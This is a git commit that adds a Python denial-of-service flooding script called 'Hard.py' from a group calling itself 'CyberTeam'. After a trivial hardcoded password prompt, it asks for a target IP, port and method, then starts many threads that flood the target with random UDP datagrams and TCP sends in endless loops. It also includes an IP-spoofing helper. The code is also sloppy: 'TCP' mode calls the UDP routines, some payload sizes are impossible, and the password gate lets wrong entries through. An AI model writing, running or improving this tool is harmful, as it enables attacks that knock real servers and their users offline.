8b67f21525775d60150ce42e7974684917b6e7a7
a8137632 <111126150+a8137632@users.noreply.github.com>
2022-08-15 21:20:16 +0800

    Add files via upload

---
+++ Hard.py
@@ -0,0 +1,201 @@
+#CyberTeam
+import random
+import socket
+import threading
+import time
+import os,sys
+import random, socket, threading
+import os
+import getpass
+
+os.system("clear")
+
+#login tools
+password ="CyberTeam"
+for i in range(3):
+	pwd = input("[+] Enter Password  : ")
+	j=3
+	if(pwd==password):
+		time.sleep(2)
+		print("[!] Checking Password! ")
+		break
+	else:
+		time.sleep(2)
+		print("[×] Wrong IS Security Password!!! ")
+		continue
+time.sleep(2)
+print("{√} Successfully Loginned")
+time.sleep(3)
+
+os.system("clear")
+
+print("Methods : OVH - UDP - TCP")
+print("Dont Abuse This Tools")
+ip = str(input("IP:"))
+port = int(input("Port:"))
+choice = str(input("Methods: "))
+times = int(input("Packet:"))
+threads = int(input("Threads:"))
+os.system("clear")
+def run():
+	data = random._urandom(577)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"Attack Has Been Launched")
+		except:
+			print("Server Has Crashed")
+			
+def run2():
+	data = random._urandom(818)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"Attack Has Been Launched")
+		except:
+			print("Server Has Crashed")
+			
+def run3():
+	data = random._urandom(818)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"Attack Has Been Launched")
+		except:
+			print("Server Has Crashed")
+			
+def run4():
+	data = random._urandom(1872637999)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"Attack Has Been Launched")
+		except:
+			print("Server Has Crashed")
+			
+def run5():
+	data = random._urandom(1872637999)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"Attack Has Been Launched")
+		except:
+			print("Server Has Crashed")
+
+def run6():
+	data = random._urandom(146734)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"Attack Has Been Launched")
+		except:
+			print("Server Has Crashed")
+
+def run7():
+    data = random._urandom(818)
+    i = random.choice(("[•]","[•]","[•]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +" ")
+        except:
+            s.close()
+            print("Server Down!!!")
+
+def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+    return assemebled
+
+for y in range(threads):
+	if choice == 'UDP':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+	if choice == 'udp':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+	if choice == 'TCP':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+	if choice == 'tcp':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+	if choice == 'GET':
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+	if choice == 'get':
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+	if choice == 'OVH':
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+	if choice == 'ovh':
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+else:
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+		th = threading.Thread(target = run6)
+		th.start()
+		th = threading.Thread(target = run7)
